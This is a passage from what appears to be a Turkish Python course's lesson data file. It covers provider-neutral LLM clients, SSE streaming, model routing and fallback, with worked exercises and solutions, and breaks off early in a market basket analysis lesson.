print(hf.chat_completion(messages=[{"role": "user", "content": "Merhaba"}], max_tokens=50))</pre><div class="tbl-wrap"><table><tr><th></th><th>Bulut API</th><th>Yerel / kendi sunucun</th></tr><tr><td>Kalite</td><td>En güçlü modeller</td><td>Küçük ve orta modeller; dar görevlerde yeterli</td></tr><tr><td>Veri</td><td>Sağlayıcıya gider (sözleşme ve KVKK değerlendirmesi gerekir)</td><td>Kurum dışına çıkmaz</td></tr><tr><td>Maliyet</td><td>Token başına ödeme</td><td>Donanım ve işletme maliyeti; hacim büyüdükçe avantajlı</td></tr><tr><td>İşletme</td><td>Sağlayıcı yönetir</td><td>GPU, güncelleme, ölçekleme senin işin</td></tr></table></div><h3>Sağlayıcıdan bağımsız istemci: Protocol</h3><p>Her sağlayıcının cevap biçimi farklıdır: biri metni <code>content</code> blok listesinde, diğeri <code>choices[0].message.content</code> içinde döndürür; token sayılarının adları bile farklıdır. Uygulama kodunun bunları bilmemesi için tek bir arayüz tanımla ve her sağlayıcıya bir <b>adaptör</b> yaz. <code>typing.Protocol</code> yapısal tip denetimi yapar: bir sınıf <code>sohbet</code> metoduna sahipse, kalıtım almadan da bu arayüzü karşılar.</p><pre class="py">from dataclasses import dataclass
from typing import Protocol

@dataclass
class Yanit:
    metin: str
    girdi_token: int
    cikti_token: int
    saglayici: str

class SohbetIstemcisi(Protocol):
    def sohbet(self, mesajlar: list[dict], azami_token: int = 512) -&gt; Yanit: ...

class SahteBulut:                         # gerçek SDK çağrısının yerine sabit ham cevap
    def sohbet(self, mesajlar, azami_token=512):
        ham = {"content": [{"type": "text", "text": "Kargonuz yarın teslim edilecek."}],
               "usage": {"input_tokens": 42, "output_tokens": 9}}
        metin = "".join(b["text"] for b in ham["content"] if b["type"] == "text")
        return Yanit(metin, ham["usage"]["input_tokens"], ham["usage"]["output_tokens"], "bulut")

class SahteYerel:
    def sohbet(self, mesajlar, azami_token=512):
        ham = {"choices": [{"message": {"content": "Kargo yarın gelir."}}],
               "usage": {"prompt_tokens": 40, "completion_tokens": 6}}
        u = ham["usage"]
        return Yanit(ham["choices"][0]["message"]["content"], u["prompt_tokens"], u["completion_tokens"], "yerel")

def ozetle(istemci: SohbetIstemcisi, sikayet: str) -&gt; str:   # uygulama kodu tek arayüzü bilir
    y = istemci.sohbet([{"role": "user", "content": f"Özetle: {sikayet}"}])
    return f"[{y.saglayici}] {y.metin} ({y.girdi_token}+{y.cikti_token} token)"

for ist in (SahteBulut(), SahteYerel()):
    print(ozetle(ist, "Siparişim 5 gündür gelmedi"))</pre><p>Bu tasarımın kazancı: testte sahte istemci verirsin, canlıda gerçek adaptörü; sağlayıcı değiştirmek tek satırlık yapılandırmadır. LiteLLM gibi kütüphaneler bu katmanı hazır sunar, ama kendi küçük arayüzünü tanımlamak bağımlılığı ve sürprizleri azaltır.</p><h3>SSE ile akışı istemciye iletmek</h3><p>Model cevabı parça parça (token token) gelir. Bunu tarayıcıya iletmenin en basit yolu <b>Server-Sent Events</b>'tir (SSE): sunucu <code>text/event-stream</code> türünde açık bir HTTP yanıtı tutar ve her olayı düz metin olarak yazar. Biçim çok basittir: isteğe bağlı <code>event:</code> ve <code>id:</code> satırları, bir ya da birkaç <code>data:</code> satırı ve olayı bitiren <b>boş satır</b>. İki nokta ile başlayan satır yorumdur (bağlantıyı canlı tutmak için kullanılır).</p><pre class="py">import json

def sse(veri, olay=None):
    satirlar = [f"event: {olay}"] if olay else []
    metin = veri if isinstance(veri, str) else json.dumps(veri, ensure_ascii=False)
    satirlar += [f"data: {s}" for s in metin.split("\\n")]
    return "\\n".join(satirlar) + "\\n\\n"

def model_akisi():                       # gerçek SDK akışının yerine
    yield from ["Kargonuz ", "yarın ", "teslim ", "edilecek."]

govde = "".join(sse({"parca": p}) for p in model_akisi()) + sse("[DONE]", olay="bitti")
print(govde)</pre><p>FastAPI'de bu üreteci <code>StreamingResponse</code> ile döndürürsün. Tarayıcı tarafında <code>EventSource</code> (yalnız GET) ya da <code>fetch</code> ile gövdeyi okuyarak parçaları ekrana eklersin. Ters vekil sunucuda (Nginx) tamponlamayı kapatmayı unutma; aksi hâlde parçalar birikip tek seferde gelir.</p><pre class="code">from fastapi import FastAPI
from fastapi.responses import StreamingResponse

app = FastAPI()

@app.get("/sohbet/akis")
async def akis(soru: str):
    async def uret():
        async with istemci.messages.stream(model=MODEL, max_tokens=500,
                                           messages=[{"role": "user", "content": soru}]) as s:
            async for parca in s.text_stream:
                yield sse({"parca": parca})
        yield sse("[DONE]", olay="bitti")
    return StreamingResponse(uret(), media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})</pre><h3>Model yönlendirme: küçük model, büyük model</h3><p>Şikâyet kategorisi seçmek gibi basit işler küçük ve ucuz modelle, uzun belge analizi ya da kod yazma gibi işler büyük modelle yapılır. Yönlendirici (router) basit kurallarla başlar: istemin uzunluğu, görev türü, istenen çıktı (JSON şeması) ve kullanıcının planı. Bir adım ötesi <b>kademeli</b> (cascade) yaklaşımdır: önce küçük model denenir, cevap doğrulamayı geçmezse (JSON bozuk, güven düşük) büyük modele gidilir. Her iki durumda da hangi isteğin hangi modele gittiğini ve maliyetini logla; yönlendirme kurallarını bu verilerle ayarlarsın.</p><div class="note"><b>Gerçek işte</b>Ilgaz Bank gibi düzenlemeye tabi kurumlarda yaygın mimari şudur: kişisel veri içeren istekler kurum içindeki yerel modele, kişisel veri içermeyen genel istekler bulut modeline gider; tüm çağrılar tek bir iç "LLM ağ geçidi" (gateway) servisinden geçer. Ağ geçidi anahtarları saklar, hız sınırı ve bütçe uygular, istekleri maskeler ve loglar. Bu bölümdeki Protocol, SSE ve yönlendirici, o ağ geçidinin küçük bir modelidir.</div>`,
    ex: [
      { t: 'mc',
        stage: 'Isınma',
        q: 'OpenAI SDK\'sıyla yazılmış bir sınıflandırma betiğini yerel Ollama modeline taşımak istiyorsun. En az değişiklik hangisi?',
        o: ['SDK\'yı kaldırıp HTTP isteklerini socket modülüyle elle yazmak', 'İstemciyi base_url="http://localhost:11434/v1" ile kurup model adını değiştirmek', 'Mesajları JSON yerine düz metin olarak göndermek gerekir', 'Yerel modeller sohbet biçimini desteklemez; istemi tek metne çevirmek'],
        a: 1,
        why: 'Ollama, vLLM ve LM Studio OpenAI uyumlu uç nokta sunar; aynı SDK base_url ve model adı değişerek kullanılır. API anahtarı yok sayılır ama boş bırakılmaz.' },
      { t: 'mc',
        stage: 'Isınma',
        q: '<code>class SohbetIstemcisi(Protocol): def sohbet(self, mesajlar): ...</code> tanımlı. <code>class Yerel:</code> sınıfı Protocol\'den kalıtım almıyor ama aynı imzalı bir <code>sohbet</code> metodu var. Ne olur?',
        o: ['Yerel, tip denetleyicisi (mypy) için SohbetIstemcisi yerine geçer: yapısal tiplemedir', 'Yerel sınıfı Protocol\'den kalıtım almadığı için çalışma anında TypeError verir', 'Protocol yalnızca soyut sınıflarla birlikte kullanıldığında çalışan bir özelliktir', 'Tip denetleyicisi yalnızca isim aynıysa (Yerel → SohbetIstemcisi) kabul eder'],
        a: 0,
        why: 'Protocol "şu metodlara sahip olan her şey" demektir (duck typing\'in tip denetimli hâli). Kalıtım gerekmez; çalışma anında hiçbir denetim yapılmaz, denetim mypy gibi araçlarda olur.' },
      { t: 'predict',
        stage: 'Kodu oku',
        q: 'Bir SSE akışını olaylara bölen kod. Ne yazdırır?',
        code: 'akis = "data: Mer\\n\\n: canli\\n\\nevent: bitti\\ndata: [DONE]\\n\\n"\nfor blok in akis.split("\\n\\n"):\n    if not blok:\n        continue\n    olay, veri = "message", []\n    for satir in blok.split("\\n"):\n        if satir.startswith(":"):\n            continue\n        alan, _, deger = satir.partition(": ")\n        if alan == "event":\n            olay = deger\n        elif alan == "data":\n            veri.append(deger)\n    if veri:\n        print(olay, "|", "\\n".join(veri))\n',
        o: ['message | Mer\nbitti | [DONE]', 'message | Mer\nmessage | canli\nbitti | [DONE]', 'message | Mer\nmessage | [DONE]', 'Mer\n[DONE]'],
        a: 0,
        why: 'Boş satır olayları ayırır. ": canli" bir yorumdur ve veri satırı olmadığı için yazdırılmaz. Olay adı verilmeyen olayın türü varsayılan olarak "message" olur.' },
      { t: 'code',
        id: 'llm-api-w1',
        stage: 'Rehberli',
        diff: 1,
        q: '<p><code>sse_bicimle(veri, olay=None, kimlik=None)</code> fonksiyonunu yaz. Sıra: varsa <code>event: ...</code>, varsa <code>id: ...</code>, sonra veri satırları. <code>veri</code> metin değilse <code>json.dumps(veri, ensure_ascii=False)</code> ile metne çevir. Metindeki her satır ayrı bir <code>data: </code> satırı olsun. Satırlar <code>\\n</code> ile birleşsin ve olay <b>boş satırla</b> bitsin (sonda <code>\\n\\n</code>).</p>',
        guide: ['Boş bir satır listesi aç; olay ve kimlik varsa önce onları ekle.', 'veri metin değilse json.dumps ile metne çevir.', 'Metni satırlara böl, her birini "data: " önekiyle listeye ekle.', 'Listeyi "\\n" ile birleştir, sonuna "\\n\\n" ekle.'],
        example: 'satirlar = ["a", "b"]\nprint(repr("\\n".join(f"x: {s}" for s in satirlar) + "\\n\\n"))\n',
        start: 'import json\n\ndef sse_bicimle(veri, olay=None, kimlik=None):\n    satirlar = []\n    # TODO: event ve id satırları\n    # TODO: veriyi metne çevir, her satırı data: ile ekle\n    return ""\n',
        sol: 'import json\n\ndef sse_bicimle(veri, olay=None, kimlik=None):\n    satirlar = []\n    if olay:\n        satirlar.append(f"event: {olay}")\n    if kimlik is not None:\n        satirlar.append(f"id: {kimlik}")\n    metin = veri if isinstance(veri, str) else json.dumps(veri, ensure_ascii=False)\n    satirlar += [f"data: {s}" for s in metin.split("\\n")]\n    return "\\n".join(satirlar) + "\\n\\n"\n',
        tests: 'assert sse_bicimle("merhaba") == "data: merhaba\\n\\n", "En basit olay: tek data satırı ve boş satır"\nassert sse_bicimle({"parca": "Çay"}) == \'data: {"parca": "Çay"}\\n\\n\', "Sözlük JSON olmalı, Türkçe karakter kaçırılmamalı"\nassert sse_bicimle("[DONE]", olay="bitti", kimlik=7) == "event: bitti\\nid: 7\\ndata: [DONE]\\n\\n", "Sıra: event, id, data"\nassert sse_bicimle("a\\nb") == "data: a\\ndata: b\\n\\n", "Çok satırlı veri her satır için ayrı data: satırı olmalı"\nassert sse_bicimle("x", kimlik=0).startswith("id: 0\\n"), "kimlik 0 da yazılmalı (None kontrolü yap)"\n',
        hints: ['SSE\'de olayı bitiren şey boş satırdır.', 'metin.split("\\n") ile satırlara böl; her birine "data: " ekle.', 'kimlik 0 olabilir: "if kimlik is not None" kullan.'],
        why: 'Veri içinde yeni satır varsa tek data: satırına yazmak olayı bozar; standart her satırın ayrı data: satırı olmasını ister ve istemci bunları \\n ile yeniden birleştirir.' },
      { t: 'code',
        id: 'llm-api-w2',
        stage: 'Rehberli',
        diff: 2,
        q: '<p>İki sağlayıcının ham cevabını ortak <code>Yanit</code> nesnesine çeviren adaptörleri yaz (dataclass hazır):</p><ul><li><code>blok_donustur(ham)</code>: <code>{"content": [{"type": "text", "text": ...}, {"type": "tool_use", ...}], "usage": {"input_tokens": .., "output_tokens": ..}}</code>. Yalnız <code>type == "text"</code> blokların metnini birleştir. saglayici: <code>"blok"</code>.</li><li><code>secenek_donustur(ham)</code>: <code>{"choices": [{"message": {"content": ...}}], "usage": {"prompt_tokens": .., "completion_tokens": ..}}</code>. İçerik <code>None</code> olabilir (yalnız araç çağrısı varsa); o zaman boş metin. saglayici: <code>"secenek"</code>.</li></ul>',
        guide: ['Blok biçiminde metin bloklarını bir comprehension ile süz ve "".join ile birleştir.', 'Token alan adlarını her biçimin kendi adlarından oku.', 'Seçenek biçiminde ilk seçeneğin message.content değerini al; None ise "" kullan.'],
        example: 'ham = {"parcalar": [{"t": "a", "v": "x"}, {"t": "b", "v": "y"}]}\nprint("".join(p["v"] for p in ham["parcalar"] if p["t"] == "a"))\n',
        start: 'from dataclasses import dataclass\n\n@dataclass\nclass Yanit:\n    metin: str\n    girdi_token: int\n    cikti_token: int\n    saglayici: str\n\ndef blok_donustur(ham):\n    # TODO\n    pass\n\ndef secenek_donustur(ham):\n    # TODO\n    pass\n',
        sol: 'from dataclasses import dataclass\n\n@dataclass\nclass Yanit:\n    metin: str\n    girdi_token: int\n    cikti_token: int\n    saglayici: str\n\ndef blok_donustur(ham):\n    metin = "".join(b["text"] for b in ham["content"] if b.get("type") == "text")\n    u = ham["usage"]\n    return Yanit(metin, u["input_tokens"], u["output_tokens"], "blok")\n\ndef secenek_donustur(ham):\n    icerik = ham["choices"][0]["message"].get("content") or ""\n    u = ham["usage"]\n    return Yanit(icerik, u["prompt_tokens"], u["completion_tokens"], "secenek")\n',
        tests: 'b = {"content": [{"type": "text", "text": "Kargo "}, {"type": "tool_use", "name": "takip"}, {"type": "text", "text": "yolda."}],\n     "usage": {"input_tokens": 30, "output_tokens": 5}}\nassert blok_donustur(b) == Yanit("Kargo yolda.", 30, 5, "blok"), "Yalnız text blokları birleştirilmeli"\ns = {"choices": [{"message": {"content": "Tamam."}}], "usage": {"prompt_tokens": 12, "completion_tokens": 2}}\nassert secenek_donustur(s) == Yanit("Tamam.", 12, 2, "secenek")\ns2 = {"choices": [{"message": {"content": None, "tool_calls": [{}]}}], "usage": {"prompt_tokens": 9, "completion_tokens": 4}}\nassert secenek_donustur(s2).metin == "", "content None ise boş metin dönmeli"\n',
        hints: ['b.get("type") == "text" süzgeciyle metin bloklarını seç.', 'ham["choices"][0]["message"].get("content") or ""'],
        why: 'Adaptörler sağlayıcıya özgü biçimi uygulamanın geri kalanından saklar. Araç çağrısı bloklarını süzmek ve None içeriği boş metne çevirmek, sonraki kodun her yerde özel durum kontrolü yapmasını önler.' },
      { t: 'code',
        id: 'llm-api-w3',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p><code>sse_ayristir(metin)</code> yaz: SSE akış metnini <code>[{"event": .., "data": .., "id": ..}]</code> listesine çevirsin. Kurallar: olaylar boş satırla (<code>\\n\\n</code>) ayrılır; <code>:</code> ile başlayan satırlar yorumdur; alan ile değer <code>": "</code> ile ayrılır; birden çok <code>data</code> satırı <code>\\n</code> ile birleşir; event yoksa <code>"message"</code>, id yoksa <code>None</code>. Hiç data satırı olmayan bloklar listeye girmez. Sondaki yarım (boş satırla bitmemiş) blok da <b>alınmaz</b>; çünkü henüz tamamlanmamıştır.</p>',
        start: 'def sse_ayristir(metin):\n    pass\n',
        sol: 'def sse_ayristir(metin):\n    bloklar = metin.split("\\n\\n")\n    tamam = bloklar[:-1]          # son parça boş ya da yarım\n    olaylar = []\n    for blok in tamam:\n        olay, kimlik, veri = "message", None, []\n        for satir in blok.split("\\n"):\n            if not satir or satir.startswith(":"):\n                continue\n            alan, _, deger = satir.partition(": ")\n            if alan == "event":\n                olay = deger\n            elif alan == "id":\n                kimlik = deger\n            elif alan == "data":\n                veri.append(deger)\n        if veri:\n            olaylar.append({"event": olay, "data": "\\n".join(veri), "id": kimlik})\n    return olaylar\n',
        tests: 'm = "data: a\\n\\n: ping\\n\\nevent: bitti\\nid: 3\\ndata: x\\ndata: y\\n\\ndata: yarim"\nr = sse_ayristir(m)\nassert r[0] == {"event": "message", "data": "a", "id": None}, f"İlk olay: {r[0]}"\nassert r[1] == {"event": "bitti", "data": "x\\ny", "id": "3"}, "Çok satırlı data \\n ile birleşmeli"\nassert len(r) == 2, "Yorum bloğu ve yarım son blok alınmamalı"\nassert sse_ayristir("") == []\n',
        hints: ['split("\\n\\n") sonucunun son elemanı ya boştur ya da henüz bitmemiş bloktur.', 'satir.partition(": ") alan ve değeri ayırır.', 'Her blokta olay="message", kimlik=None, veri=[] ile başla.'],
        why: 'Akış ağdan parça parça geldiği için son blok yarım olabilir; gerçek istemciler tamponda tutup bir sonraki parçayla birleştirir. Yorum satırları bağlantıyı canlı tutmak (keep-alive) içindir.' },
      { t: 'code',
        id: 'llm-api-w4',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Kurallı model yönlendirici yaz: <code>yonlendir(istem, json_gerekli=False)</code> <code>"kucuk"</code> ya da <code>"buyuk"</code> döndürsün. Kurallar sırayla:</p><ol><li>Tahmini token (<code>math.ceil(len(istem) / 4)</code>) 1500\'den büyükse <code>"buyuk"</code>.</li><li>İstem (Türkçe küçük harfe çevrilmiş: önce <code>"I"→"ı"</code>, <code>"İ"→"i"</code>, sonra <code>lower()</code>) şu kelimelerden birini <b>kelime başı olarak</b> içeriyorsa <code>"buyuk"</code>: <code>"analiz", "kod", "karşılaştır", "neden"</code> (ör. "kodu" ve "Analizi" eşleşir, "dekod" eşleşmez).</li><li><code>json_gerekli</code> doğruysa ve istem 300 karakterden uzunsa <code>"buyuk"</code>.</li><li>Aksi hâlde <code>"kucuk"</code>.</li></ol>',
        start: 'def yonlendir(istem, json_gerekli=False):\n    pass\n',
        sol: 'import math\nimport re\n\nANAHTAR = ("analiz", "kod", "karşılaştır", "neden")\n\ndef tr_kucuk(s):\n    return s.replace("I", "ı").replace("İ", "i").lower()\n\ndef yonlendir(istem, json_gerekli=False):\n    if math.ceil(len(istem) / 4) > 1500:\n        return "buyuk"\n    k = tr_kucuk(istem)\n    if any(re.search(r"\\b" + a, k) for a in ANAHTAR):\n        return "buyuk"\n    if json_gerekli and len(istem) > 300:\n        return "buyuk"\n    return "kucuk"\n',
        tests: 'assert yonlendir("Bu şikâyetin kategorisi nedir?") == "kucuk", "Basit sınıflandırma küçük modele"\nassert yonlendir("Bu kodu incele") == "buyuk", "kelime başında \'kod\' büyük modele"\nassert yonlendir("ANALİZ yap") == "buyuk", "Türkçe büyük harf İ doğru küçültülmeli"\nassert yonlendir("Mesaj dekodlandı mı?") == "kucuk", "\'dekod\' kelime başı değil"\nassert yonlendir("x" * 6001) == "buyuk", "6001 karakter ≈ 1501 token"\nassert yonlendir("y" * 301, json_gerekli=True) == "buyuk"\nassert yonlendir("y" * 301) == "kucuk"\n',
        hints: ['Kelime başı için regex \\b kullan: re.search(r"\\b" + kelime, metin).', 'Python\'un lower() metodu "İ" harfini "i̇" (noktalı iki karakter) yapar; önce replace ile düzelt.'],
        why: 'Kurallı yönlendirme açıklanabilir ve ucuzdur. Loglardan hangi isteklerin küçük modelde başarısız olduğunu görerek kuralları zamanla ayarlarsın; gerekirse küçük bir sınıflandırıcıyla değiştirirsin.' },
      { t: 'code',
        id: 'llm-api-w5',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p><code>YedekliIstemci(saglayicilar)</code> sınıfını yaz. <code>saglayicilar</code>, <code>sohbet(mesajlar)</code> metodu olan nesnelerin listesi (hepsi aynı Protocol\'ü karşılar). <code>sohbet(mesajlar)</code> sırayla dener: <code>GeciciHata</code> gelirse sonraki sağlayıcıya geçer; <code>KaliciHata</code> (ör. geçersiz istek) gelirse hiç denemeden <b>yeniden fırlatır</b>; hepsi geçici hatayla düşerse son hatayı <code>RuntimeError("tüm sağlayıcılar başarısız")</code> ile fırlatır (<code>raise ... from hata</code>). Başarıda yanıtı döndürür ve kaçıncı sağlayıcının cevap verdiğini <code>self.son_kullanilan</code> (0 tabanlı) alanına yazar.</p>',
        start: 'class GeciciHata(Exception):\n    pass\n\nclass KaliciHata(Exception):\n    pass\n\nclass YedekliIstemci:\n    pass\n',
        sol: 'class GeciciHata(Exception):\n    pass\n\nclass KaliciHata(Exception):\n    pass\nclass YedekliIstemci:\n    def __init__(self, saglayicilar):\n        self.saglayicilar = list(saglayicilar)\n        self.son_kullanilan = None\n\n    def sohbet(self, mesajlar):\n        son_hata = None\n        for i, s in enumerate(self.saglayicilar):\n            try:\n                yanit = s.sohbet(mesajlar)\n            except GeciciHata as h:\n                son_hata = h\n                continue\n            self.son_kullanilan = i\n            return yanit\n        raise RuntimeError("tüm sağlayıcılar başarısız") from son_hata\n',
        tests: 'class S:\n    def __init__(self, sonuc):\n        self.sonuc, self.cagri = sonuc, 0\n    def sohbet(self, mesajlar):\n        self.cagri += 1\n        if isinstance(self.sonuc, Exception):\n            raise self.sonuc\n        return self.sonuc\na, b = S(GeciciHata("429")), S("yedek cevap")\ny = YedekliIstemci([a, b])\nassert y.sohbet([]) == "yedek cevap" and y.son_kullanilan == 1, "Geçici hatada ikinciye geçmeli"\nc, d2 = S(KaliciHata("400")), S("kullanılmamalı")\ntry:\n    YedekliIstemci([c, d2]).sohbet([])\n    assert False, "KaliciHata yeniden fırlatılmalı"\nexcept KaliciHata:\n    pass\nassert d2.cagri == 0, "Kalıcı hatada yedek sağlayıcı denenmemeli"\ntry:\n    YedekliIstemci([S(GeciciHata("a")), S(GeciciHata("b"))]).sohbet([])\n    assert False, "Hepsi düşünce RuntimeError beklenir"\nexcept RuntimeError as h:\n    assert str(h.__cause__) == "b", "Son hata __cause__ olarak bağlanmalı (raise ... from)"\n',
        hints: ['Yalnız GeciciHata\'yı yakala; KaliciHata yakalanmazsa kendiliğinden yukarı çıkar.', 'Döngü bitince raise RuntimeError(...) from son_hata.'],
        why: 'Yedekleme (fallback) yalnız geçici sorunlar için anlamlıdır. Geçersiz istek her sağlayıcıda da geçersizdir; onu denemeye devam etmek maliyeti ve gecikmeyi artırır.' },
      { t: 'code',
        id: 'llm-api-w6',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>akis_govdesi(parcalar)</code> model parçalarını SSE gövdesine çeviriyor: her parça için <code>data: {"parca": ...}</code> olayı, en sonda <code>event: bitti</code> ve <code>data: [DONE]</code>. Tarayıcıda parçalar birbirine yapışıyor, Türkçe karakterler <code>\\u00e7</code> gibi görünüyor ve bitiş olayı hiç tetiklenmiyor.</p>',
        start: 'import json\n\ndef akis_govdesi(parcalar):\n    govde = ""\n    for p in parcalar:\n        govde += "data: " + json.dumps({"parca": p}) + "\\n"\n    govde += "event: bitti\\ndata: [DONE]"\n    return govde\n',
        sol: 'import json\n\ndef akis_govdesi(parcalar):\n    govde = ""\n    for p in parcalar:\n        govde += "data: " + json.dumps({"parca": p}, ensure_ascii=False) + "\\n\\n"\n    govde += "event: bitti\\ndata: [DONE]\\n\\n"\n    return govde\n',
        tests: 'g = akis_govdesi(["Çay ", "hazır"])\nassert g == \'data: {"parca": "Çay "}\\n\\ndata: {"parca": "hazır"}\\n\\nevent: bitti\\ndata: [DONE]\\n\\n\', f"Gelen: {g!r}"\nassert akis_govdesi([]) == "event: bitti\\ndata: [DONE]\\n\\n", "Parça yoksa yalnız bitiş olayı"\n',
        hints: ['Tek \\n ile biten satırlar aynı olayın parçası sayılır; olayı boş satır bitirir.', 'json.dumps Türkçe karakterleri varsayılan olarak kaçırır: ensure_ascii=False.'],
        why: 'SSE\'de olay sınırı boş satırdır; tek \\n ile yazılan data satırları tek bir olayda birleşir. Son olay da boş satırla bitmezse istemci onu tamamlanmamış sayar ve hiç tetiklemez.' },
      { t: 'code',
        id: 'llm-api-w7',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>Asenkron akış aktarıcısı yaz: <code>async def sse_akisi(kaynak)</code> bir <b>async generator</b> olsun. <code>kaynak</code> metin parçaları üreten bir async iterator. Her parça için <code>data: {"i": sira, "parca": parca}</code> olayı üret (sira 0\'dan başlar; JSON <code>ensure_ascii=False</code>). Kaynak bitince <code>event: bitti</code> olayı, verisi <code>{"parca_sayisi": n, "karakter": toplam}</code>. Kaynak bir istisna fırlatırsa <code>event: hata</code> olayı, verisi <code>{"mesaj": str(hata)}</code> üret ve dur (istisnayı yutma ama dışarı da fırlatma). Her olay <code>\\n\\n</code> ile biter.</p>',
        start: 'import json\n\nasync def sse_akisi(kaynak):\n    pass\n',
        sol: 'import json\n\ndef _olay(veri, olay=None):\n    bas = f"event: {olay}\\n" if olay else ""\n    return bas + "data: " + json.dumps(veri, ensure_ascii=False) + "\\n\\n"\n\nasync def sse_akisi(kaynak):\n    n = karakter = 0\n    try:\n        async for parca in kaynak:\n            yield _olay({"i": n, "parca": parca})\n            n += 1\n            karakter += len(parca)\n    except Exception as h:\n        yield _olay({"mesaj": str(h)}, "hata")\n        return\n    yield _olay({"parca_sayisi": n, "karakter": karakter}, "bitti")\n',
        tests: 'import asyncio\nasync def kaynak(parcalar, hata=None):\n    for p in parcalar:\n        await asyncio.sleep(0)\n        yield p\n    if hata:\n        raise hata\nasync def topla(gen):\n    return [o async for o in gen]\nr = asyncio.run(topla(sse_akisi(kaynak(["Mer", "haba"]))))\nassert r[0] == \'data: {"i": 0, "parca": "Mer"}\\n\\n\', f"İlk olay: {r[0]!r}"\nassert r[-1] == \'event: bitti\\ndata: {"parca_sayisi": 2, "karakter": 7}\\n\\n\', f"Bitiş olayı: {r[-1]!r}"\nr2 = asyncio.run(topla(sse_akisi(kaynak(["a"], TimeoutError("zaman aşımı")))))\nassert len(r2) == 2 and r2[1] == \'event: hata\\ndata: {"mesaj": "zaman aşımı"}\\n\\n\', f"Hata olayı bekleniyordu: {r2!r}"\nassert asyncio.run(topla(sse_akisi(kaynak([]))))[0].startswith("event: bitti"), "Boş kaynakta yalnız bitiş olayı"\n',
        hints: ['async def içinde yield kullanınca fonksiyon async generator olur; kaynağı async for ile gez.', 'Döngüyü try/except Exception ile sar; hata olayını yield ettikten sonra return ile çık.', 'Bitiş olayını try bloğunun dışında, döngü normal bitince üret.'],
        why: 'İstemciye hata olayı göndermek, bağlantıyı sessizce koparmaktan çok daha iyi bir kullanıcı deneyimi verir: arayüz "yanıt yarıda kaldı, tekrar dene" diyebilir. FastAPI bu üreteci StreamingResponse ile doğrudan yayınlar.' }
    ],
    faq: [
      { q: 'Yerel model mi, bulut API mi seçmeliyim?',
        a: 'Önce görevi bulut modelinde çalışır hâle getir ve bir değerlendirme seti oluştur. Sonra aynı seti yerel modelde çalıştır: kalite yeterliyse ve veri gizliliği ya da hacim maliyeti önemliyse yerele geç. Çoğu kurum ikisini birlikte kullanır; Protocol tabanlı istemci bu geçişi kolaylaştırır.' },
      { q: 'SSE mi WebSocket mi?',
        a: 'LLM cevabı gibi tek yönlü (sunucudan istemciye) akışlarda SSE daha basittir: düz HTTP, otomatik yeniden bağlanma, vekil sunucularla uyumlu. İstemcinin de sürekli veri gönderdiği (ses, ortak düzenleme) iki yönlü senaryolarda WebSocket kullanılır. FastAPI dersindeki ek bölümde ikisini de görürsün.' }
    ],
    mistakes: [
      { bad: 'yield "data: " + json.dumps(veri) + "\\n"',
        good: 'yield "data: " + json.dumps(veri, ensure_ascii=False) + "\\n\\n"',
        why: 'SSE olayını boş satır bitirir; tek \\n ile olaylar birbirine yapışır.' }
    ] }
);
})(window);
/* Kesit Python — 'ml-kumeleme' dersi uzantısı: market sepeti analizi ve öğe benzerliği önerisi (AUDIT Ekle-7) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  { id: 'ml-kumeleme',
    min: 22,
    html: `<h2>Derinleş: market sepeti analizi ve basit öneri</h2><p>Kümeleme müşterileri gruplar; sepet analizi (market basket analysis) ise <b>ürünleri</b> birlikte satın alınma davranışına göre ilişkilendirir. "Kitap alan kupa da alıyor mu?", "Güneş kremi sepetine şampuan önerelim mi?" gibi soruların cevabı buradadır. Bu da etiketsiz (denetimsiz) bir öğrenme problemidir: hedef sütun yok, yalnızca birlikte görülme sayıları var. Bu bölümde Anadolu Market'in gerçek <code>order_items</code> tablosunu (910 sipariş, 1620 satır) kullanacaksın.</p><h3>Üç ölçü: destek, güven, lift</h3><p>N sipariş içinde A ürününü içeren sepet sayısı n(A), hem A hem B içeren sepet sayısı n(A, B) olsun. "A alan B de alır" kuralı (A → B) için:</p><div class="tbl-wrap"><table><tr><th>Ölçü</th><th>Formül</th><th>Ne söyler?</th></tr><tr><td>Destek (support)</td><td>n(A, B) / N</td><td>Bu ikili ne kadar yaygın? Küçükse kural az müşteriyi etkiler.</td></tr><tr><td>Güven (confidence)</td><td>n(A, B) / n(A)</td><td>A alanların yüzde kaçı B de alıyor? Yöne bağlıdır: A → B ile B → A farklıdır.</td></tr><tr><td>Lift</td><td>güven(A → B) / destek(B)</td><td>Birliktelik tesadüften kaç kat fazla? 1 bağımsızlık, 1'in üstü çekim, altı itme demektir. Simetriktir.</td></tr></table></div><p>Güven tek başına yanıltır: B zaten çok popülerse (her sepette su varsa) "A alan su da alır" kuralının güveni yüksek çıkar ama hiçbir şey öğretmez. Lift, B'nin kendi yaygınlığına bölerek bu etkiyi ayıklar.</p><pre class="py">import veri
import pandas as pd

kalemler = veri.oku("anadolu_market", "order_items")
urunler = veri.oku("anadolu_market", "products").set_index("product_id")

# sipariş × ürün ikili matris: hücre "bu sepette bu ürün var mı?"
sepet = pd.crosstab(kalemler["order_id"], kalemler["product_id"]) &gt; 0
print(sepet.shape)                       # (sipariş sayısı, ürün sayısı)

def kural(m, a, b):
    destek = (m[a] &amp; m[b]).mean()        # bool ortalaması = oran
    guven = destek / m[a].mean()
    lift = guven / m[b].mean()
    return round(destek, 4), round(guven, 4), round(lift, 2)

a, b = 10, 13
print(urunler.loc[a, "name"], "-&gt;", urunler.loc[b, "name"])
